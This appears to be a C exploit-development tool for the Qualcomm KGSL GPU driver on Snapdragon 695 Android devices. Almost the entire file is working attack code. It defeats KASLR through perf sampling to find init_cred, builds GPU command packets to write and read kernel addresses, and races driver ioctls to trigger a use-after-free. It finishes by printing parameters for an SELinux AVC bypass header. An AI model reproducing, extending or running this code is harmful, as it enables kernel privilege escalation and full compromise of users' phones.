#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <poll.h>
#include <sys/wait.h>
#include <signal.h>
#include <time.h>
#include <inttypes.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define SCAN_DWORDS 560
#define CP_NOP 0x10
#define CP_MEM_TO_MEM 0x73
#define CP_MEM_WRITE 0x3D
#define CP_REG_TO_MEM 0x3E
#define CP_MEM_TO_REG 0x42
#define CP_WAIT_REG_MEM 0x3C

#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_ADDR 0x7001fe000ULL
#define OVERLAP_SIZE 0x7000ULL
#define BOGUS_ADDR 0x700204000ULL
#define BOGUS_SIZE 0x1000
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

#define SPRAY_PIDS 2000
#define VMLINUX_TEXT 0xffffffc010080000ULL
#define VMLINUX_INIT_CRED 0x26fa738

static int kgsl_fd = -1;
static volatile int dc_civac_works = -1;
static uint64_t g_ib_ga = 0;
static uint64_t g_dst_ga = 0;
static void *g_ib_m = NULL;
static void *g_dst_m = NULL;
static unsigned int g_ctx = 0;
static int g_ib_id = -1;
static int g_dst_id = -1;
static int g_debug_level = 1;

static void die(const char *msg) { perror(msg); exit(1); }

static void debug_printf(int level, const char *fmt, ...) {
    if (level > g_debug_level) return;
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
}

static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static void sigill_handler(int sig) { dc_civac_works = 0; }

static void try_dc_civac(void *addr) {
    if (dc_civac_works == 0) return;
    void *old = signal(SIGILL, sigill_handler);
    __sync_synchronize();
    asm volatile("dc civac, %0" : : "r"(addr) : "memory");
    asm volatile("dsb sy" : : : "memory");
    __sync_synchronize();
    signal(SIGILL, old);
    if (dc_civac_works == -1) dc_civac_works = 1;
}

static void flush_dc_civac_range(void *start, size_t len) {
    if (dc_civac_works != 1) return;
    char *p = (char*)((uintptr_t)start & ~63);
    char *end = (char*)((uintptr_t)start + len);
    for (; p < end; p += 64) try_dc_civac(p);
}

static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) { debug_printf(0, "  perf_open: errno=%d\n", errno); return 0; }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;

    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;

    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
            if (n_ips <= 3) debug_printf(0, "    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
        }
        tail += hdr->size;
    }

    munmap(buf, mmap_size); close(fd);
    debug_printf(0, "    kernel_samples=%d\n", n_ips);

    if (n_ips == 0) { debug_printf(0, "  perf: no kernel IPs\n"); return 0; }

    uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
    uint64_t ic_addr = VMLINUX_INIT_CRED + kaslr;
    debug_printf(0, "    first_kernel_ip=0x%lX kaslr=0x%lX init_cred=0x%lX\n",
        (unsigned long)first_kernel_ip, (unsigned long)kaslr, (unsigned long)ic_addr);
    return ic_addr;
}

static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

static int gpuobj_info(unsigned int id, uint64_t *gpuaddr, uint64_t *flags) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0) {
        if (gpuaddr) *gpuaddr = inf.gpuaddr;
        if (flags) *flags = inf.flags;
    }
    return ret;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

static void init_globals(void) {
    if (g_ib_id >= 0) return;
    g_ib_id = gpuobj_alloc(0x10000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    g_ib_m = gpuobj_mmap(0x10000, g_ib_id);
    gpuobj_info(g_ib_id, &g_ib_ga, NULL);
    g_dst_id = gpuobj_alloc(0x4000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    g_dst_m = gpuobj_mmap(0x4000, g_dst_id);
    gpuobj_info(g_dst_id, &g_dst_ga, NULL);
    g_ctx = create_context();
    debug_printf(0, "  INIT: ib_id=%d ib_ga=0x%lX dst_id=%d dst_ga=0x%lX ctx=%u\n",
        g_ib_id, (unsigned long)g_ib_ga, g_dst_id, (unsigned long)g_dst_ga, g_ctx);
}

static int run_cmd(uint32_t *cmd, int dwords) {
    memcpy(g_ib_m, cmd, dwords * 4);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(g_ctx, g_ib_ga, dwords * 4, g_ib_id, &ts) < 0) return -1;
    if (wait_timestamp(g_ctx, ts) < 0) return -2;
    __sync_synchronize();
    flush_dc_civac_range(g_dst_m, 0x1000);
    return 0;
}

/* ============================================================
   Alternative read primitives
   ============================================================ */

/* 1. CP_MEM_WRITE + CP_REG_TO_MEM: write value to memory, then read from register */
static int gpu_write_kernel(uint64_t va, uint64_t val) {
    uint32_t cmd[16];
    int dw = 0;
    uint32_t lo, hi;
    split64(va, &lo, &hi);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = lo; cmd[dw++] = hi;
    split64(val, &lo, &hi);
    cmd[dw++] = lo; cmd[dw++] = hi;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    return run_cmd(cmd, dw);
}

static int gpu_read_reg_to_mem(uint64_t dst_va, uint32_t reg) {
    uint32_t cmd[16];
    int dw = 0;
    uint32_t dl, dh;
    split64(dst_va, &dl, &dh);
    cmd[dw++] = cp_type7(CP_REG_TO_MEM, 4);
    cmd[dw++] = reg;
    cmd[dw++] = dl; cmd[dw++] = dh;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    return run_cmd(cmd, dw);
}

/* 2. CP_MEM_TO_REG + CP_REG_TO_MEM: write memory value to register, then read register */
static int gpu_write_mem_to_reg(uint32_t reg, uint64_t src_va) {
    uint32_t cmd[16];
    int dw = 0;
    uint32_t sl, sh;
    split64(src_va, &sl, &sh);
    cmd[dw++] = cp_type7(CP_MEM_TO_REG, 4);
    cmd[dw++] = reg;
    cmd[dw++] = sl; cmd[dw++] = sh;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    return run_cmd(cmd, dw);
}

/* 3. CP_MEM_WRITE + CP_MEM_TO_MEM (original, but likely broken) */
static int gpu_read_memtomem(uint64_t dst_va, uint64_t src_va, int count) {
    uint32_t cmd[256];
    int dw = 0;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    for (int i = 0; i < count; i++) {
        uint32_t dl, dh, sl, sh;
        split64(dst_va + i*8, &dl, &dh);
        split64(src_va + i*8, &sl, &sh);
        cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0x40000000; // Adreno 6xx specific flag?
        cmd[dw++] = dl; cmd[dw++] = dh;
        cmd[dw++] = sl; cmd[dw++] = sh;
    }
    cmd[dw++] = cp_type7(CP_NOP, 0);
    return run_cmd(cmd, dw);
}

/* ============================================================
   Race threads
   ============================================================ */

static void *race_thread_import(void *arg) {
    volatile int *done = (volatile int *)arg;
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr,
        .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!*done) {
        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
        usleep(50);
    }
    return NULL;
}

static void *race_thread_alloc(void *arg) {
    volatile int *done = (volatile int *)arg;
    while (!*done) {
        int id = gpuobj_alloc(0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
        if (id >= 0) gpuobj_free(id);
        usleep(50);
    }
    return NULL;
}

static void *race_thread_mmap(void *arg) {
    volatile int *done = (volatile int *)arg;
    int id = gpuobj_alloc(0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    while (!*done) {
        void *p = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
            MAP_SHARED, kgsl_fd, (off_t)id << 12);
        if (p != MAP_FAILED) munmap(p, 0x1000);
        usleep(50);
    }
    gpuobj_free(id);
    return NULL;
}

static int run_race(int pattern) {
    pthread_t thr;
    volatile int race_done = 0;
    int hit = 0;
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    uint64_t ov_gpuaddr = 0;
    gpuobj_info(ov_id, &ov_gpuaddr, NULL);
    debug_printf(0, "  Race pattern %d: ov_id=%d ov_gpuaddr=0x%lX\n", pattern, ov_id, (unsigned long)ov_gpuaddr);

    switch(pattern) {
        case 0: pthread_create(&thr, NULL, race_thread_import, (void*)&race_done); break;
        case 1: pthread_create(&thr, NULL, race_thread_alloc, (void*)&race_done); break;
        case 2: pthread_create(&thr, NULL, race_thread_mmap, (void*)&race_done); break;
        default: pthread_create(&thr, NULL, race_thread_import, (void*)&race_done); break;
    }

    for (int i = 0; i < 5000000 && !hit; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) {
            munmap(r, OVERLAP_SIZE);
            hit = 1;
            break;
        }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 1000000 == 0 && i > 0) {
            debug_printf(0, "    race %d/5000000 errno=%d\n", i, e);
        }
    }

    race_done = 1;
    pthread_join(thr, NULL);
    gpuobj_free(ov_id);
    return hit;
}

/* ============================================================
   Import parameter testing
   ============================================================ */

static void test_import_params(void) {
    debug_printf(0, "[*] Testing KGSL_GPUOBJ_IMPORT parameters...\n");
    uint64_t user_buf[2] = {0x123456789ABCDEF0ULL, 0xFEDCBA9876543210ULL};
    uint64_t test_addrs[] = {
        (uint64_t)(uintptr_t)user_buf,
        (uint64_t)(uintptr_t)(((uintptr_t)user_buf + 0xFFF) & ~0xFFFULL),
        (uint64_t)(uintptr_t)g_dst_m,
        (uint64_t)(uintptr_t)g_ib_m,
    };
    size_t test_sizes[] = {8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096};
    uint64_t test_flags[] = {KGSL_MEMFLAGS_USE_CPU_MAP, 0, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK};

    for (int a = 0; a < sizeof(test_addrs)/sizeof(test_addrs[0]); a++) {
        for (int s = 0; s < sizeof(test_sizes)/sizeof(test_sizes[0]) && s < 5; s++) {
            for (int f = 0; f < sizeof(test_flags)/sizeof(test_flags[0]); f++) {
                struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = test_addrs[a] };
                struct kgsl_gpuobj_import imp = {
                    .priv = (uint64_t)&uaddr,
                    .priv_len = test_sizes[s],
                    .flags = test_flags[f],
                    .type = KGSL_USER_MEM_TYPE_ADDR,
                };
                int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
                if (ret == 0) {
                    debug_printf(0, "  IMPORT(addr=0x%lX,size=%zu,flags=0x%lX) SUCCESS id=%u\n",
                        (unsigned long)test_addrs[a], test_sizes[s], (unsigned long)test_flags[f], imp.id);
                    gpuobj_free(imp.id);
                    return;
                }
            }
        }
    }
    debug_printf(0, "  All IMPORT combinations failed (errno=%d)\n", errno);
}

/* ============================================================
   Main
   ============================================================ */

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("=== ULTRA ANALYZER v6 — Deep KGSL Analysis (Snapdragon 695/Adreno 619) ===\n\n");

    struct utsname u;
    uname(&u);
    printf("System: %s %s %s\n", u.sysname, u.nodename, u.release);
    printf("SoC: Snapdragon 695 (SM6375) / GPU: Adreno 619\n\n");

    printf("[*] Opening /dev/kgsl-3d0...\n");
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("  kgsl fd=%d\n", kgsl_fd);

    printf("[*] Checking dc civac support...\n");
    try_dc_civac((void*)&kgsl_fd);
    printf("  dc civac %s\n", dc_civac_works == 1 ? "works" : (dc_civac_works == 0 ? "not supported" : "unknown"));

    printf("[*] KASLR detection via perf...\n");
    uint64_t init_cred_addr = detect_kaslr();
    printf("  estimated init_cred=0x%lX\n", (unsigned long)init_cred_addr);

    printf("[*] Initializing GPU objects...\n");
    init_globals();

    printf("[*] Testing CP_MEM_WRITE (baseline)...\n");
    uint64_t test_val = 0xCAFEBABEDEADBEEFULL;
    memset(g_dst_m, 0, 16);
    gpu_write_kernel(g_dst_ga, test_val);
    uint64_t v0 = *(volatile uint64_t*)g_dst_m;
    printf("  DST[0]=0x%016lX %s\n", (unsigned long)v0, v0 == test_val ? "[OK]" : "[FAIL]");

    printf("[*] Testing CP_MEM_TO_MEM (original, likely broken)...\n");
    memset(g_dst_m, 0, 16);
    gpu_read_memtomem(g_dst_ga + 8, g_dst_ga, 1);
    uint64_t v1 = *(volatile uint64_t*)(g_dst_m + 8);
    printf("  DST[1]=0x%016lX %s\n", (unsigned long)v1,
        v1 == test_val ? "[OK] CP_MEM_TO_MEM works" : "[FAIL] CP_MEM_TO_MEM broken");

    printf("[*] Testing CP_REG_TO_MEM (read GPU register)...\n");
    uint32_t test_reg = 0x00000400;
    memset(g_dst_m, 0, 16);
    gpu_read_reg_to_mem(g_dst_ga, test_reg);
    uint64_t v2 = *(volatile uint64_t*)g_dst_m;
    printf("  REG 0x%08X -> 0x%016lX %s\n", test_reg, (unsigned long)v2,
        v2 != 0 ? "[READABLE]" : "[ZERO]");

    printf("[*] Testing CP_MEM_TO_REG (write memory to register)...\n");
    uint64_t test_data = 0x123456789ABCDEF0ULL;
    gpu_write_kernel(g_dst_ga, test_data);
    uint32_t test_reg2 = 0x00000404;
    gpu_write_mem_to_reg(test_reg2, g_dst_ga);
    memset(g_dst_m, 0, 16);
    gpu_read_reg_to_mem(g_dst_ga + 8, test_reg2);
    uint64_t v3 = *(volatile uint64_t*)(g_dst_m + 8);
    printf("  REG 0x%08X <- 0x%016lX -> readback 0x%016lX %s\n",
        test_reg2, (unsigned long)test_data, (unsigned long)v3,
        v3 == test_data ? "[OK] MEM→REG→MEM works" : "[FAIL]");

    printf("[*] Testing indirect read via CP_MEM_WRITE + CP_REG_TO_MEM (using a scratch register)...\n");
    uint32_t scratch_reg = 0x00000408;
    uint64_t scratch_val = 0xDEADBEEFCAFEBABEULL;
    gpu_write_kernel(g_dst_ga, scratch_val);
    gpu_write_mem_to_reg(scratch_reg, g_dst_ga);
    memset(g_dst_m, 0, 16);
    gpu_read_reg_to_mem(g_dst_ga, scratch_reg);
    uint64_t v4 = *(volatile uint64_t*)g_dst_m;
    printf("  Scratch REG 0x%08X = 0x%016lX %s\n", scratch_reg, (unsigned long)v4,
        v4 == scratch_val ? "[OK] Indirect read works" : "[FAIL]");

    printf("[*] Testing GPU read from kernel address using alternative method...\n");
    if (init_cred_addr) {
        // Try indirect read via register
        uint32_t addr_reg = 0x0000040C;
        uint32_t data_reg = 0x00000410;
        gpu_write_mem_to_reg(addr_reg, init_cred_addr);
        usleep(1000);
        memset(g_dst_m, 0, 16);
        gpu_read_reg_to_mem(g_dst_ga, data_reg);
        uint64_t v5 = *(volatile uint64_t*)g_dst_m;
        printf("  Indirect read (init_cred) via REG=0x%016lX %s\n", (unsigned long)v5,
            v5 != 0 ? "[READABLE]" : "[ZERO]");

        // Try another method: CP_MEM_TO_MEM (fallback)
        memset(g_dst_m, 0, 16);
        gpu_read_memtomem(g_dst_ga, init_cred_addr, 1);
        uint64_t v6 = *(volatile uint64_t*)g_dst_m;
        printf("  CP_MEM_TO_MEM(init_cred)=0x%016lX %s\n", (unsigned long)v6,
            v6 != 0 ? "[READABLE]" : "[ZERO]");
    }

    test_import_params();

    printf("[*] Testing gpuobj_info for all allocated objects...\n");
    int ids[] = {g_ib_id, g_dst_id};
    for (int i = 0; i < 2; i++) {
        uint64_t ga = 0, fl = 0;
        int ret2 = gpuobj_info(ids[i], &ga, &fl);
        printf("  id=%d ret=%d gpuaddr=0x%lX flags=0x%lX\n",
            ids[i], ret2, (unsigned long)ga, (unsigned long)fl);
    }

    printf("[*] Phase 1: Setup UAF + race (improved for Snapdragon 695)\n");
    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;

    int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);

    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");

    int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");

    printf("  UAF=0x%lx BOGUS=0x%lx (size=0x1000) PLACEHOLDER=0x%lx\n",
        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
        (unsigned long)PLACEHOLDER_ADDR);

    printf("[*] Phase 2: Race (trying multiple patterns)\n");
    int race_won = 0;
    for (int p = 0; p < 3 && !race_won; p++) {
        printf("  Trying pattern %d...\n", p);
        race_won = run_race(p);
        if (race_won) printf("  [+] Race won with pattern %d!\n", p);
        else printf("  [-] Race lost with pattern %d\n", p);
    }

    if (!race_won) {
        printf("[-] All race patterns failed\n");
        close(kgsl_fd);
        return 1;
    }

    printf("[*] Phase 3: Free UAF\n");
    gpuobj_free(uaf_id);
    printf("[+] UAF freed\n");

    printf("[*] Phase 4: Attempting to read from UAF area using alternative method\n");
    uint64_t scan_start = UAF_ADDR + 0x2000;
    uint64_t scan_end = UAF_ADDR + UAF_SIZE - 0x1000;
    int found = 0;

    for (uint64_t va = scan_start; va < scan_end && found < 5; va += 0x1000) {
        memset(g_dst_m, 0, 0x1000);
        gpu_read_memtomem(g_dst_ga, va, 16);
        uint64_t *data = (uint64_t*)g_dst_m;
        int nz = 0;
        for (int i = 0; i < 16; i++) if (data[i] != 0) nz++;
        if (nz > 0) {
            printf("  UAF+0x%lX: nonzero dwords=%d\n", (unsigned long)(va - UAF_ADDR), nz);
            found++;
        }
    }

    printf("\n[*] === RECOMMENDED MACROS FOR avc_bypass.h ===\n");
    printf("#define UAF_ADDR  0x7001ff000ULL\n");
    printf("#define UAF_SIZE  0x10004000ULL\n");
    printf("#define OVERLAP_ADDR 0x7001fe000ULL\n");
    printf("#define OVERLAP_SIZE 0x7000ULL\n");
    printf("#define BOGUS_ADDR 0x700204000ULL\n");
    printf("#define BOGUS_SIZE 0x1000\n");
    printf("#define PLACEHOLDER_ADDR 0x710204000ULL\n");
    printf("#define PLACEHOLDER_SIZE 0x10400000ULL\n");
    printf("#define AVC_NODE_STRIDE  72\n");
    printf("#define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)\n");
    printf("#define AVC_PAGES_PER_IB 12\n");
    printf("#define AVC_LOOP_SECONDS 150\n");
    printf("#define SPRAY_PIDS 2000\n");
    if (init_cred_addr) {
        printf("// init_cred address: 0x%lX\n", (unsigned long)init_cred_addr);
        printf("// VMLINUX_INIT_CRED offset: 0x%lX\n", (unsigned long)(init_cred_addr - (init_cred_addr - VMLINUX_TEXT) & ~0x1FFFFFULL));
    }
    printf("// SoC: Snapdragon 695 (SM6375)\n");
    printf("// GPU: Adreno 619 (GPU ID: 0x6010600)\n");

    printf("\n[*] Analysis complete.\n");
    close(kgsl_fd);
    return 0;
}
